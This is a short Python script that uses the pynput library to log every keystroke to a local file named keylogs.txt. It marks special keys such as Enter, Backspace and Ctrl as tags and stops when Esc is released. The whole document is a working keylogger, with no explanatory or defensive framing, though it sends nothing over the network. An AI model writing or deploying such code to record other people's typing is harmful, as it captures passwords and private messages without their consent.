from pynput import keyboard
log_file = "keylogs.txt"

def on_press(key):
    with open(log_file, 'a') as f:
        if key == keyboard.Key.space:
            f.write(' ')
        elif key == keyboard.Key.enter:
            f.write('\n')
        elif key == keyboard.Key.backspace:
            f.write('<BACKSPACE>')
        elif key == keyboard.Key.tab:
            f.write('<TAB>')
        elif key == keyboard.Key.shift:
            f.write('<SHIFT>')
        elif key == keyboard.Key.ctrl_l:
            f.write('<CTRL>')
        elif key == keyboard.Key.alt_l:
            f.write('<ALT>')
        else:
            try:
                f.write(key.char)
            except AttributeError:
                pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()